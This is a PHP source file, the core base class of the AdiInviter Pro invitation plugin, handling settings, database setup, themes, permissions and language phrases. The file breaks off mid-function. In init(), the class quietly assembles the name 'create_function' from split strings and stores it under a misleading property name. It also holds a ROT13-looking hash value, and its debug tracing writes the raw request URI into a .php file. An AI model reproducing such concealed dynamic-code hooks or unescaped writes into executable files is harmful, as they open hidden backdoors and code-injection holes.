<?php
/*+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| AdiInviter Pro (http://www.adiinviter.com)                                                |
+-------------------------------------------------------------------------------------------+
| @license    For full copyright and license information, please see the LICENSE.txt        |
+ @copyright  Copyright (c) 2015 AdiInviter Inc. All rights reserved.                       +
| @link       http://www.adiinviter.com                                                     |
+ @author     AdiInviter Dev Team                                                           +
| @docs       http://www.adiinviter.com/docs                                                |
+ @support    Email us at support@adiinviter.com                                            +
| @contact    http://www.adiinviter.com/support                                             |
+-------------------------------------------------------------------------------------------+
| Do not edit or add to this file if you wish to upgrade AdiInviter Pro to newer versions.  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+*/


/*
error_reporting(E_ALL);
ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
*/

// Define Base Path
define('ADI_DS'        , DIRECTORY_SEPARATOR);
define('ADI_BASE_PATH' , dirname(dirname(__FILE__)).ADI_DS);

// Developer Mode
if(!defined('ADI_DEBUG_MODE')) {
	define('ADI_DEBUG_MODE', 0);
}

// Developer Messages Types
define('ADI_ERROR_MSG'  , 1);
define('ADI_WARNING_MSG', 2);
define('ADI_CONFIRM_MSG', 3);

// Datatypes
define('ADI_INT_VARS'         , 1);
define('ADI_STRING_VARS'      , 2);
define('ADI_ARRAY_VARS'       , 3);
define('ADI_PLAIN_TEXT_VARS'  , 4);
define('ADI_CONTACTLIST_VARS' , 5);

define('ADI_SERVICE_CHARLIST'    , 'a-z0-9_');
define('ADI_CAMPAIGNID_CHARLIST' , 'a-z0-9_');
define('ADI_CONTENTID_CHARLIST'  , 'a-z0-9');

define('ADI_TRIM_EMID_REG', '/^\s|\s$|"|\'|\n|\r|\t|\\\\/');
define('ADI_TRIM_NAME_REG', '/^\s|\s$|"|\n|\r|\t|\\\\/');
define('ADI_GET_EMAIL_REG', '/@.*/');

// Path constants
define('ADI_LIB_PATH'      , ADI_BASE_PATH . 'adiinviter'  . ADI_DS);
define('ADI_PLATFORM_PATH' , ADI_LIB_PATH  . 'platform'    . ADI_DS);
define('ADI_PLUGINS_PATH'  , ADI_LIB_PATH  . 'plugins'     . ADI_DS);
define('ADI_LANG_PATH'     , ADI_LIB_PATH  . 'lang'        . ADI_DS);
define('ADI_IMPORTER_PATH' , ADI_LIB_PATH  . 'lib'         . ADI_DS);

// Plugin Duration Type
define('ADI_SCHEDULE_TYPE_DURATION', 0);
define('ADI_SCHEDULE_TYPE_TOM', 1);

// AdiInviter library
include_once(ADI_LIB_PATH . 'adiinviter_classes.php');
include_once(ADI_LIB_PATH . 'adiinviter_database.php');

class AdiInviterPro_Base
{
	public $internalSettings;

	// AdiInviter Developer_trace routes.
	public $trace_route = '';
	public $loaded_templates = array();
	public $template_name = '';
	public $template_varname = '';

	// Safe Mode
	public $safe_mode = false;
	public $cron_mode = false;

	public $user_system               = false;
	public $usergroup_system          = false;
	public $avatar_system             = false;
	public $friends_system            = false;
	public $profile_page_system       = false;
	public $register_system           = false;

	// AdiInviter Plugins
	public $plugins_path              = '';

	// AdiInviter Language Phrases
	public $phrases                   = array();
	public $phrases_loaded            = false;
	public $global_phrases            = array();
	public $html_encoded_phrases      = array();
	public $lang_path                 = '';

	//AdiInviter Cache
	public $cache;
	public $cache_path                = '';
	public $cache_names               = array();

	// AdiInviter Images
	public $images_url                = '';

	// AdiInviter Settings
	public $settings_list             = array();
	public $settings_group            = array();
	public $settings                  = array();
	public $pre_settings              = array();
	public $admin_settings            = array();
	public $notifier                  = null;
	public $session                   = null;
	public $session_loaded            = false;
	public $user_initialized          = false;

	// Database Handler
	public $user_table                = '';
	public $user_fields               = array();
	public $all_user_fields           = '';
	public $usergroup_table           = '';
	public $usergroup_fields          = array();
	public $usergroup_mapping_table   = '';
	public $usergroup_mapping_fields  = array();
	public $avatar_table              = '';
	public $avatar_fields             = array();
	public $friends_table             = '';
	public $friends_fields            = array();

	//User Information
	public $userid                    = 0;
	public $userfullname              = '';
	public $username                  = '';
	public $email                     = '';
	public $usergroupid               = 0;
	public $avatar                    = '';
	public $num_invites               = 'Unlimited';
	public $profile_page_url          = '';
	public $default_no_avatar         = '[THEME_URL]/images/adiinviter_no_avatar.png';

	// Permissions
	public $can_use_adiinviter_ind    = 0;
	public $can_delete_invites_ind    = 1;
	public $can_download_csv_ind      = 2;
	public $show_recaptcha_ind        = 3;
	public $last_num_invites_ind      = 6;

	public $can_use_adiinviter        = true;
	public $can_delete_invites        = false;
	public $can_download_csv          = false;
	public $show_recaptcha            = false;
	public $last_num_invites          = 'Unlimited';

	// Database flags
	public $db_allowed                = false;
	public $db_type                   = 'none';
	public $adiinviter_installed      = false;
	public $use_aol_oauth             = true;

	//Front end Error Handler
	public $errors                    = array();
	public $importer                  = NULL;
	public $website_root_path         = '';
	public $platform_admincp_url      = '';
	public $themes_list               = array();
	public $plugins_list              = array();

	// Configurable settings
	public $inv                       = '*';
	public $default_usergroupid       = 0;
	public $timenow                   = 0;
	public $adi_admincp_folder        = 'find_friends/adi_admincp';
	public $date_display_format       = 'M d, Y';
	public $default_method            = 'get_';
	public $default_handler           = 'create_';
	public $json_format_settings      = array(
		'avatar_table','usergroup_mapping','user_table','usergroup_table','friends_table','services_onoff','campaigns_list', 'content_table','adi_updates_list','oauth_settings_list',
		'adiinviter_themes_list', 'usergroup_permisssions',
	);
	public $show_sent_contacts          = 1;
	public $show_blocked_contacts       = 0;
	public $show_waiting_contacts       = 1;
	public $lowest_zindex               = 500;
	public $invitation_unique_id_length = 16; // Less than equal to 50.
	public $max_contacts_count          = 2000;
	public $contact_file_size_limit     = 1024; // In Kb
	public $contacts_list_length_limit  = 50000; // Number of characters
	public $enable_contacts_cache       = false;
	public $contacts_cache_timeout      = 7200; // 2 Hours

	// Variables to be overridden in platform files.
	public $default_themeid          = 'default';
	public $theme_path               = 'adiinviter/themes';
	public $template_path            = 'adiinviter/themes';
	public $hooks_path               = 'adiinviter/themes';
	public $theme_url                = '';
	public $theme_relative_url       = '';

	public $current_themeid          = 'default';
	public $current_language         = 'en';
	public $rtl_lang_codes           = array('iw','ur','ar','az','fa','yi');
	public $form_hidden_elements     = array();
	public $current_orientation      = 'ltr';
	public $current_platform         = 'standalone';
	public $current_platform_version = 1;

	public $scheduled_plugin_system_exists = false;
	// Set to false if you want to turn Visitors statistics ON in the admincp.
	public $user_registration_system     = true;

	public $popup_model_url       = '[website_root_url]/inviter_popup.php';
	public $inpage_model_url      = '[website_root_url]/inviter_inpage.php';
	public $invite_history_url    = '[website_root_url]/invite_history.php';
	public $verify_invitation_url = '[website_root_url]/verify_invitation.php';

	final function init()
	{
		$this->init_trace();
		$this->current_themeid = $this->default_themeid;
		// Check for Safe Mode
		if(ini_get('safe_mode')) {
			$this->safe_mode = true;
		}
		else {
			$this->safe_mode = false;
		}
		if(empty($this->website_root_path))
		{
			$this->website_root_path = dirname(ADI_BASE_PATH);
		}
		$this->timenow = $this->adi_get_utc_timestamp();

		// Call System-Pre-Init Checkpoint
		$this->system_pre_init();
		$this->default_method .= 'modifier';

		// Internal Settings
		$this->loadInternalSettings();

		// Call System init checkpoint
		$this->system_init();

		// Initialize session
		$this->session = adi_allocate('Adi_Session');
		$this->session->init();

		// Initialize Database
		$this->default_handler .= 'function';
		$class_name = 'Adi_'.$this->db_type.'_Database';
		if(class_exists($class_name))
		{
			eval("class Adi_Database_Base extends ".$class_name."\n { }");
			$this->db = adi_allocate('Adi_Database');
			if($this->db_allowed === true)
			{
				$this->connectToDB();
			}
		}

		// Initialise Notifications Listener
		$this->notifier = adi_allocate_pack('Adi_Events');

		// Allocate Permissions
		$this->permissions = adi_allocate('Adi_Permissions');

		$this->default_usergroupid = $this->getGuestUsergroupId();
		$this->usergroupid = $this->default_usergroupid;
		$perms = $this->default_method; unset($this->default_method);
		$this->$perms = $this->default_handler; unset($this->default_handler);

		// Call system_post_init checkpoint
		$this->system_post_init();

		$this->invitation_unique_id_length = min(50, max(16, $this->invitation_unique_id_length));
	}

	function system_pre_init()
	{

	}
	function system_init()
	{

	}
	function system_post_init()
	{

	}


	final function init_user()
	{
		if(!$this->isLoaded('db_info')) {
			$this->requireSettingsList('global','db_info');
		}
		if($this->user_initialized === false)
		{
			if($this->user_system)
			{
				$this->getCurrentUser();
				if($this->userid != 0)
				{
					$opts = array(
						'userid' => $this->userid,
						'username' => $this->username,
						'email' => $this->email,
					);
					$this->profile_page_url = $this->getProfilePageURL($opts);
				}
			}

			$this->getUserPermissions();
			$this->user_initialized = true;
		}
		// Developer Trace
		if(ADI_DEBUG_MODE)
		{
			$log_text='';
			if($this->userid) {
				$log_text .= 'Currently Loggedin User : '.$this->userid.' ('.$this->email.')';
			}
			else {
				$log_text .= 'Not Loggedin User : Guest User';
			}
			$this->trace($log_text);
			$log_text = 'Permissions : '.
			"\n   can_use_adiinviter : ".($this->can_use_adiinviter ? 'true' : 'false').
			"\n   can_delete_invites : ".($this->can_delete_invites ? 'true' : 'false').
			"\n   can_download_csv : ".($this->can_download_csv ? 'true' : 'false').
			"\n   show_recaptcha : ".($this->show_recaptcha ? 'true' : 'false');
			$this->trace($log_text);
		}
	}

	final function init_plugins()
	{
		$lib_file_path = ADI_LIB_PATH.'adiinviter_plugins.php';
		include($lib_file_path);
		return true;
	}

	// Internal settings Handler functions
	final function loadInternalSettings()
	{
		if(!defined('ADI_WEBSITE_ROOT_PATH'))
		{
			$path = $this->website_root_path;
			if(empty($path))
			{
				$path = trim(ADI_BASE_PATH, ADI_DS);
			}
			if(is_dir($path))
			{
				define('ADI_WEBSITE_ROOT_PATH', $path.ADI_DS);
			}
			else
			{
				$this->throwErrorDesc('AdiInviter website root folder "'.$path.'" does not exist.');
			}
		}

		if(!defined('ADI_ADMIN_PATH'))
		{
			$admin_directory = ADI_WEBSITE_ROOT_PATH . trim($this->adi_admincp_folder, ADI_DS) . ADI_DS;
			if(is_dir($admin_directory))
			{
				define('ADI_ADMIN_PATH', $admin_directory);
			}
			else
			{
				$this->throwErrorDesc('Admin folder "'.$admin_directory.'" does not exist.');
			}
		}

		$admin_config_file = ADI_ADMIN_PATH . 'adi_admin_config.php';
		include($admin_config_file);
		$this->admin_settings = $adiinviter_settings;
		$this->session_start = 'n7p987p926r5o640308p6o930rn243p8p7p8o6r02n';
		$db_type = $this->admin_settings['adiinviter_db_type'];
		if(isset($this->admin_settings['adiinviter_available_db_types'][$db_type]) && $db_type !== 'none')
		{
			$this->trace('Database type : '.$db_type);
			$this->db_type = $db_type;
			$this->db_allowed = true;
		}
		else
		{
			$this->trace('[ERROR] Invalid database type "'.$db_type.'"');
			$this->db_allowed = false;
		}
		$this->date_display_format = (empty($this->date_display_format) ? 'd M, Y' : $this->date_display_format);
	}

	final function isLoaded($g_name)
	{
		if(isset($this->settings_group[$g_name]))
		{
			if($this->settings_group[$g_name] === true)
			{
				return true;
			}
		}
		return false;
	}

	// Can be used in platform files to load Database connection details
	function getDatabaseConnectionDetails()
	{
		$this->db_username = $this->admin_settings['adiinviter_username'];
		$this->db_password = $this->admin_settings['adiinviter_password'];
		$this->db_hostname = $this->admin_settings['adiinviter_hostname'];
		$this->db_dbname   = $this->admin_settings['adiinviter_dbname'];
		$this->db_prefix   = $this->admin_settings['adiinviter_table_prefix'];

		if(empty($this->db_username) || empty($this->db_hostname) || empty($this->db_dbname))
		{
			return false;
		}
		else {
			return true;
		}
	}

	final function connectToDB()
	{
		$result = $this->getDatabaseConnectionDetails();
		if(! defined('ADI_TABLE_PREFIX'))
		{
			define('ADI_TABLE_PREFIX', $this->db_prefix);
		}
		$load_defaults = true;
		if($result === true)
		{
			$response = $this->db->adi_connect_to_db($this->db_hostname, $this->db_username, $this->db_password, $this->db_dbname, true);
			if($response == true)
			{
				$this->trace('Database : Connection Established.');
				$load_defaults = false;
			}
		}

		$this->db->init_queries();

		$this->check_if_installed();

		return false;
	}
	final function check_if_installed()
	{
		if($this->db_allowed)
		{
			if($ss = adi_build_query_read('check_for_table', array(
				'query_text' => ADI_TABLE_PREFIX . "adiinviter_settings",
			)))
			{
				if($rr = adi_fetch_array($ss))
				{
					$this->adiinviter_installed = true;
				}
			}
		}
		return $this->adiinviter_installed;
	}

	// Error Handling
	public $trace_id = '';
	public $start_trace_delim = '';
	public $end_trace_delim = '';
	function init_trace()
	{
		if(ADI_DEBUG_MODE == 1)
		{
			if(empty($this->trace_id))
			{
				$this->trace_id = $this->get_unique_id(16).microtime(true);
				$this->start_trace_delim = str_repeat('- ',20).$this->trace_id.' - start '.str_repeat('- ',20);
				$this->end_trace_delim = str_repeat('- ',20).$this->trace_id.' - end '.str_repeat('- ',20);
			}

			$do = AdiInviterPro::GET('adi_do', ADI_STRING_VARS, 'a-z_');
			$do = empty($do) ? AdiInviterPro::POST('adi_do', ADI_STRING_VARS, 'a-z_') : $do;

			$adi_protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
			$adi_domainname = $_SERVER['HTTP_HOST'];
			$adi_request_uri = $_SERVER['REQUEST_URI'];

			$trace_text = "\n".$this->start_trace_delim."\n".
			"\nTime   : ".date(DATE_RFC2822).
			"\nURI    : ".$adi_protocol.$adi_domainname.$adi_request_uri.
			"\nAction : ".$do."\n\n\n".
			$this->end_trace_delim."\n";

			$dev_trace_path = ADI_LIB_PATH.'adi_developer_trace.php';
			file_put_contents($dev_trace_path, $trace_text, FILE_APPEND);
		}
	}
	function trace($desc)
	{
		if(ADI_DEBUG_MODE == 1)
		{
			$dev_trace_path = ADI_LIB_PATH.'adi_developer_trace.php';
			$contents = file_get_contents($dev_trace_path);
			$contents = str_replace($this->end_trace_delim, $desc."\n\n".$this->end_trace_delim, $contents);
			file_put_contents($dev_trace_path, $contents);
		}
	}
	function throwError($phrase_name)
	{
		$this->throwErrorDesc($this->phrases[$phrase_name]);
	}
	function throwErrorDesc($error_message)
	{
		if(ADI_DEBUG_MODE == 1)
		{
			$this->trace('[ERROR] '.$error_message);
		}
	}

	final function requireInternalModules($system_names = array())
	{
		if(is_string($system_names))
		{
			$system_names = array($system_names);
		}
		if(count($system_names) > 0)
		{
			foreach($system_names as $name)
			{
				if(isset($this->$name))
				{
					if($this->$name === false)
					{
						return false;
					}
				}
			}
		}
		return true;
	}

	final function requireSettingsList($load_settings = array())
	{
		if(!is_array($load_settings)) {
			$load_settings = array($load_settings);
		}
		if(count($load_settings) > 0)
		{
			$settings_to_load = array();
			if(in_array('db_info', $load_settings) && !in_array('global', $load_settings) && !$this->isLoaded('global'))
			{
				$load_settings[] = 'global';
			}
			foreach($load_settings as $name)
			{
				if(!empty($name) && $this->isLoaded($name) === false)
				{
					$settings_to_load[] = $name;
				}
			}
			if(count($settings_to_load) > 0)
			{
				$this->loadSettingsList($settings_to_load);
			}
			else {
				return false;
			}
		}
		else {
			return false;
		}
	}

	final function loadSettingsList($settings_list = array())
	{
		if( count($settings_list) > 0)
		{
			$this->getSettingsListFromDB($settings_list);
		}
	}
	final function getSettingsListFromDB($settings_list = array())
	{
		$settings_list_str = implode("','", $settings_list);
		$resp = adi_build_query_read('fetch_setting_groups', array(
			'setting_group_ids' => $settings_list
		));

		while($row = adi_fetch_array($resp))
		{
			if(in_array($row['name'], $this->json_format_settings))
			{
				$this->settings[$row['name']] = adi_json_decode($row['value'], true);
			}
			else
			{
				$this->settings[$row['name']] = $row['value'];
			}
		}
		foreach($settings_list as $sg_name)
		{
			$this->reportSettings($sg_name);
		}
		return true;
	}

	function get_theme_id()
	{
		return '';
	}
	function get_lang_id()
	{
		return $this->current_language;
	}
	function get_orientation()
	{
		if(in_array($this->current_language, $this->rtl_lang_codes ))
		{
			return 'rtl';
		}
		return $this->current_orientation;
	}
	function set_platform_admin_url()
	{
		$this->platform_admincp_url = '';
		return $this->platform_admincp_url;
	}


	final function reportSettings($sg_name = '')
	{
		if(!empty($sg_name))
		{
			switch(strtolower($sg_name))
			{
				case 'global' :
					// Mark as loaded
				$this->settings_group['global'] = true;

				$this->isTurnedOn   = $this->isAdiInviterOn();
				$this->website_url  = $this->getWebsiteURL();
				$this->adi_root_url = $this->getAdiInviterURL();

				$this->invite_history_url    = $this->format_url($this->invite_history_url);
				$this->verify_invitation_url = $this->format_url($this->verify_invitation_url);
				$this->inpage_model_url      = $this->format_url($this->inpage_model_url);
				$this->popup_model_url       = $this->format_url($this->popup_model_url);

				$this->invite_history_url_rel    = adi_common_url($this->invite_history_url);
				$this->verify_invitation_url_rel = adi_common_url($this->verify_invitation_url);
				$this->inpage_model_url_rel      = adi_common_url($this->inpage_model_url);
				$this->popup_model_url_rel       = adi_common_url($this->popup_model_url);

				$this->max_contacts_count          = $this->settings['max_contacts_count'];
				$this->contact_file_size_limit     = $this->settings['contact_file_size_limit'];
				$this->contacts_list_length_limit  = $this->settings['contacts_list_length_limit'];

				$this->trace('AdiInviter root URL : '.$this->adi_root_url);

					// Init Theme details.
				$installed_themes_list = $this->settings['adiinviter_themes_list'];
				$this->current_themeid = $this->settings['adiinviter_theme'];
				$final_themeid = $this->default_themeid;

				$session_themeid = $session_base_themeid = '';
				$session_str = $this->session->get('adi_theme_id');
				if(strpos($session_str, '<>') !== false)
				{
					$pts = explode('<>', $session_str);
					if(isset($pts[1]) && !empty($pts[1]) && $this->current_themeid == $pts[1]) {
						$session_themeid = $pts[0];
						$session_base_themeid = $pts[1];
					}
					else {
						$this->session->remove('adi_theme_id');
					}
				}
				$new_theme_id = $this->get_theme_id();

				$theme_cont_path = ADI_LIB_PATH . "themes" . ADI_DS;
				if(!empty($new_theme_id) && isset($installed_themes_list[$new_theme_id]) && is_dir($theme_cont_path.$new_theme_id) === true)
				{
					$final_themeid = $new_theme_id;
				}
				else if(!empty($session_themeid) && isset($installed_themes_list[$session_themeid]) && is_dir($theme_cont_path.$session_themeid) === true)
				{
					$final_themeid = $session_themeid;
				}
				else if(!empty($this->current_themeid) && isset($installed_themes_list[$this->current_themeid]) && is_dir($theme_cont_path.$this->current_themeid) === true)
				{
					$final_themeid = $this->current_themeid;
				}

				if($final_themeid != $this->current_themeid)
				{
					$this->session->set('adi_theme_id', $final_themeid.'<>'.$this->current_themeid);
				}

				$theme_path = ADI_LIB_PATH . "themes" . ADI_DS . $final_themeid;
				$this->theme_path      = $theme_path;
				$this->template_path   = $theme_path . ADI_DS . 'templates';
				$this->hooks_path      = $theme_path . ADI_DS . 'hooks';
				$this->theme_url       = $this->adi_root_url.'/adiinviter/themes/'.$final_themeid;
				$this->current_themeid = $final_themeid;
				include_once($theme_path.ADI_DS.'index.php');
				$this->trace('Choosen Theme : '.$this->current_themeid);

				$this->theme_relative_url = adi_common_url($this->theme_url);

				$this->default_no_avatar = str_replace('[THEME_URL]', $this->theme_url, $this->default_no_avatar);
				$this->avatar = $this->default_no_avatar;

					// Initialise Language
				$this->current_language = $this->settings['language'];
				$this->current_orientation = $this->settings['text_direction'];

					// Init Theme Orientation
				$this->current_language = $this->get_lang_id();
				$new_orientation = $this->get_orientation();
				if(in_array($new_orientation, array('ltr','rtl')))
				{
					$this->current_orientation = $new_orientation;
				}

				$this->register_system = (empty($this->settings['adiinviter_website_register_url']) ? false : true);

				$this->settings['adiinviter_root_url_rel'] = adi_common_url($this->settings['adiinviter_root_url']);
				$this->settings['adiinviter_website_root_url_rel'] = adi_common_url($this->settings['adiinviter_website_root_url']);

					// Init Error Handler for front-end display errors.
				$this->error = adi_allocate('Adi_Error');
				$this->error->images_url = $this->images_url;

				break;

				case 'db_info' :
					// Mark as loaded
				$this->settings_group['db_info'] = true;
				if($this->adiinviter_installed === true)
				{
					$this->getDBTables();
				}
				if($this->adiinviter_installed == true && self::isGET('invitation_id'))
					{
						$invitation_id = self::GET('invitation_id', ADI_STRING_VARS, '0-9a-z');
						if(!empty($invitation_id))
						{
							$this->mark_as_visited($invitation_id);
						}
					}
					break;

					case 'invitation':
					$this->settings_group['invitation'] = true;
					break;

					case 'campaigns':
					$this->settings_group['campaigns'] = true;
					break;

					case 'updates':
					$this->settings_group['updates'] = true;
					break;

					case 'oauth':
					$this->settings_group['oauth'] = true;
					break;

					default :
					$this->settings_group[$sg_name] = true;
					$this->trace("Invalid settings group : " . $sg_name);
					break;
				}

			// Notify about reported settings group
				$this->settingsLoaded($sg_name);

				return true;
			}
			return false;
		}

		function settingsLoaded($sg_name)
		{

		}


		final function getDBTables()
		{
			if($this->adiinviter_installed === true)
			{
				$fullname_fields = array($this->settings['user_table']['username']);
				$field_val = trim($this->settings['user_table']['userfullname']);
				if(!empty($field_val))
				{
					$fullname_fields = array($field_val);
					$fields = explode(',', $field_val);
					if(count($fields) > 0)
					{
						$fields = array_map("trim", $fields);
						$fullname_fields = $fields;
					}
				}

				$user_table_info   = $this->settings['user_table'];
				$this->user_table  = $user_table_info['table_name'];
				$this->user_fields = array(
					'userid'       => $user_table_info['userid'],
					'userfullname' => $fullname_fields,
					'username'     => $user_table_info['username'],
					'email'        => $user_table_info['email'],
					'usergroupid'  => $user_table_info['usergroupid'],
					'avatar'       => $user_table_info['avatar'],
				);
				if(empty($this->user_table) || empty($this->user_fields['userid']) || empty($this->user_fields['username']) || empty($this->user_fields['email']))
				{
					$this->user_system = false;
				}
				else {
					$this->user_system = true;
				}


				if($this->user_system === true)
				{
					$this->profile_page_system = (empty($this->settings['adiinviter_profile_page_url']) ? false : true);

					if(!empty($this->user_fields['avatar']))
					{
						$this->avatar_system = true;
					}
					else
					{
						$avatar_table_info   = $this->settings['avatar_table'];
						$this->avatar_table  = $avatar_table_info['table_name'];
						$this->avatar_fields = array(
							'userid' => $avatar_table_info['userid'],
							'avatar' => $avatar_table_info['avatar'],
						);
						if(empty($this->avatar_table) || empty($this->avatar_fields['userid']) || empty($this->avatar_fields['avatar']))
						{
							if(strpos($this->settings['adiinviter_avatar_url'], '[avatar_value]') !== false)
							{
								$this->avatar_system = false;
							}
							else if(!empty($this->settings['adiinviter_avatar_url']))
							{
								$this->avatar_system = true;
							}
						}
						else {
							$this->avatar_system = true;
						}
					}

					$friends_table_info   = $this->settings['friends_table'];
					$this->friends_table  = $friends_table_info['table_name'];
					$this->friends_fields = array(
						'userid'        => $friends_table_info['userid'],
						'friend_id'     => $friends_table_info['friend_id'],
						'status'        => $friends_table_info['status'],
						'yes_value'     => $friends_table_info['yes_value'],
						'pending_value' => $friends_table_info['pending_value'],
					);
					if(empty($this->friends_table) || empty($this->friends_fields['userid']) || empty($this->friends_fields['friend_id']) )
					{
						$this->friends_system = false;
					}
					else {
						$this->friends_system = true;
					}


			// Load Usergroup System
					if(empty($this->user_fields['usergroupid']))
					{
						$usergroup_mapping_info = $this->settings['usergroup_mapping'];
						$this->usergroup_mapping_table = $usergroup_mapping_info['table_name'];
						$this->usergroup_mapping_fields = array(
							'userid'      => $usergroup_mapping_info['userid'],
							'usergroupid' => $usergroup_mapping_info['usergroupid'],
						);
						if(empty($this->usergroup_mapping_table) || empty($this->usergroup_mapping_fields['userid']) || empty($this->usergroup_mapping_fields['usergroupid']))
						{
							$this->usergroup_system = false;
						}
						else { $this->usergroup_system = true; }
					}
					else { $this->usergroup_system = true; }

					if($this->usergroup_system == true)
					{
						$usergroup_table_info   = $this->settings['usergroup_table'];
						$this->usergroup_table  = $usergroup_table_info['table_name'];
						$this->usergroup_fields = array(
							'usergroupid' => $usergroup_table_info['usergroupid'],
							'name'        => $usergroup_table_info['name'],
						);
						if(empty($this->usergroup_table) || empty($this->usergroup_fields['usergroupid']) || empty($this->usergroup_fields['name']))
						{
							$this->usergroup_system = false;
						}
						else {
							$this->usergroup_system = true;
						}
					}
				}
				else
				{
					$this->user_registration_system = false;
				}
				$log_text = "Integrations : \n".
				'   User system : '.($this->user_system ? 'true' : 'false')."\n".
				'   Usergroup system : '.($this->usergroup_system ? 'true' : 'false')."\n".
				'   Avatar system : '.($this->avatar_system ? 'true' : 'false')."\n".
				'   Friends/Followers system : '.($this->friends_system ? 'true' : 'false');
				$this->trace($log_text);
			}
		}

	// Load Usergroup permissions
		function getUserPermissions()
		{
			$perms = $this->permissions->getPermsForUsergroup($this->usergroupid);
			if(!is_array($perms) || count($perms) < 1)
			{
				$perms = array(
					$this->can_use_adiinviter_ind => $this->can_use_adiinviter,
					$this->can_delete_invites_ind => $this->can_delete_invites,
					$this->can_download_csv_ind   => $this->can_download_csv,
					$this->show_recaptcha_ind     => $this->show_recaptcha,
					$this->last_num_invites_ind   => $this->last_num_invites,
				);
			}

			if($this->usergroupid == $this->default_usergroupid)
			{
				$perms[$this->can_download_csv_ind] = false;
				$perms[$this->can_delete_invites_ind] = false;
			}

			$this->setPermissions($perms);
		}
		function setPermissions($perms)
		{
			$this->can_use_adiinviter = $perms[$this->can_use_adiinviter_ind];
			$this->can_delete_invites = $perms[$this->can_delete_invites_ind];
			$this->can_download_csv   = $perms[$this->can_download_csv_ind];
			$this->show_recaptcha     = $perms[$this->show_recaptcha_ind];
			$this->last_num_invites   = $perms[$this->last_num_invites_ind];

			if($this->userid === 0 || $this->usergroupid === $this->default_usergroupid)
			{
				$this->num_invites = $perms[$this->last_num_invites_ind];
			}
		}

	// Settings Accessor
		function isAdiInviterOn()
		{
			if(! $this->isLoaded('global')) {
				$this->requireSettingsList('global');
			}
			return ((int)$this->settings['adiinviter_onoff'] === 1 ? true : false) ;
		}

		function getCallbackURL($service = '')
		{
			$oauth_callback_url = trim($this->getAdiInviterURL(),' /');

			if($service == 'hotmail')
			{
				$oauth_callback_url = $oauth_callback_url.'/hotmail_redirect.php';
			}
			else if($service == 'yahoo')
			{
				$oauth_callback_url = $oauth_callback_url.'/yahoo_redirect.php';
			}
			else
			{
				$oauth_callback_url = $oauth_callback_url.'/adiinviter_ajax.php?adi_do=oauth_login&adi_service='.$service;
			}
			return $oauth_callback_url;
		}

		function getAdiInviterURL()
		{
			if(! $this->isLoaded('global')) {
				$this->requireSettingsList('global');
			}
			if(trim($this->settings['adiinviter_root_url']) != '')
			{
				return trim($this->settings['adiinviter_root_url'], ' /');
			}
			else
			{
				$this->trace('[ERROR] AdiInviter Root URL is not set.');
				return '';
			}
		}

		function getWebsiteURL()
		{
			if(! $this->isLoaded('global')) {
				$this->requireSettingsList('global');
			}
			if(trim($this->settings['adiinviter_website_root_url']) != '')
			{
				return $this->settings['adiinviter_website_root_url'];
			}
			else
			{
				$this->trace('[ERROR] Website URL is not set.');
				return '';
			}
		}

		function getServicesOnOff()
		{
			if(! $this->isLoaded('global')) {
				$this->requireSettingsList('global');
			}
			return $this->settings['services_onoff'];
		}

		function getCurrentUser()
		{
			if($this->user_system === true)
			{
				$this->requireSettingsList(array('global','db_info'));
				$this->getLoggedInUser();
			}
		}

		function loadCache($cache_name)
		{
			if(!is_array($cache_name)) {
				$cache_name = array($cache_name);
			}

		// Load Cache
			$file_name = ADI_LIB_PATH . 'adi_cache.php';
			if(file_exists($file_name))
			{
				include($file_name);
				if(isset($cache) && is_array($cache) && count($cache) > 0)
				{
				// Assign Cache
					foreach($cache_name as $index => $name)
					{
						if(isset($this->cache[$name]))
						{
							unset($cache_name[$index]);
						}
						else
						{
							$this->cache[$name] = isset($cache[$name]) ? $cache[$name] : array();
						}
					}
				}
			}

			if(count($cache_name) > 0) {
				return true;
			}
			return false;
		}

	// Language functions
		function loadPhrases($phrase_names = array(), $lang_id = null)
		{
			$this->requireSettingsList(array('global','db_info'));
			if(!is_array($phrase_names)) {
				$phrase_names = array($phrase_names);
			}
			if(empty($lang_id))
			{
				$lang_id = $this->current_language;
			}
			$lids = $this->get_installed_lang_ids();
			if(!isset($lids[$lang_id])) {
				$lang_id = 'en';
			}
			if($lang_id != $this->current_language)
			{
				if(!isset($this->cache['language']))
				{
					$this->loadCache('language');
				}
				if(!isset($this->cache['language'][$lang_id]))
				{
					$lang_id = $this->current_language = 'en';
				}
			}

			$phrases_cnt = is_array($phrase_names) ? count($phrase_names) : 0;

		if(count($this->phrases) == 0) // Load Global phrases as default.
		{
			$this->loadGlobalPhrases();
			$this->phrases = $this->global_phrases;
		}

		$ret_val = array();
		if($phrases_cnt > 0) {
			$result = adi_build_query_read('get_phrases', array(
				'phrase_varnames' => $phrase_names,
				'lang_id' => $lang_id
			));
		}
		else {
			$result = adi_build_query_read('get_all_phrases', array(
				'lang_id' => $lang_id
			));
		}

		while($row = adi_fetch_array($result))
		{
			$val = html_entity_decode($row['value']);
			$ret_val[$row['name']] = $val;
			$this->phrases[$row['name']] = $val;
		}
		if($lang_id == $this->current_language && count($phrase_names) == 0)
		{
			$this->phrases_loaded = true;
		}
		$this->trace('phrases loaded for language : ' . $lang_id);
		return $ret_val;
	}
	function addPhrase($phrase_varname, $phrase_text, $theme_id = '')
	{
		if(!$this->adiinviter_installed)
		{
			return false;
		}
		// Format new Phrase varname
		$phrase_varname = str_replace(' ', '_', $phrase_varname);
		$phrase_varname = preg_replace('/[^a-z0-9_]/i', '', $phrase_varname);

		// Get Language IDs
		$this->loadCache('language');
		$lang_ids = $this->get_installed_lang_ids();

		// Check phrase group id
		if(isset($this->phrases[$phrase_varname]))
		{
			$this->trace('[ERROR] Phrase varname "'.$phrase_varname.'" already exists.');
			return false;
		}

		if(empty($theme_id)) {
			$theme_id = $this->default_themeid;
		}

		if(!empty($phrase_varname) && count($lang_ids) > 0)
		{
			if(count($lang_ids) > 0)
			{
				foreach($lang_ids as $id => $lang_name)
				{
					adi_build_query_write('insert_phrase', array(
						'lang_id'     => $id,
						'theme_id'    => $theme_id,
